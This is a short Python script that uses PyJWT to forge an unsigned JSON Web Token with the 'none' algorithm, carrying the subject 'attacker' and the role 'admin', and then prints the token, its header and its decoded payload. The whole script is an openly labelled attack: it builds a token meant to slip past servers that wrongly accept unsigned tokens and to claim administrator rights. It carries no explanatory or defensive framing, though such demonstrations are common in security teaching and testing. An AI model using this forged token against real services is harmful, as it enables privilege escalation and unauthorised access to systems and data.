import jwt

payload = {
    "sub": "attacker",
    "role": "admin"
}

unsigned_token = jwt.encode(
    payload,
    key="",
    algorithm="none"
)

print("\nUNSIGNED JWT:")
print(unsigned_token)

print("\nJWT HEADER:")
print(jwt.get_unverified_header(unsigned_token))

print("\nDECODED PAYLOAD:")
print(jwt.decode(
    unsigned_token,
    options={"verify_signature": False}
))

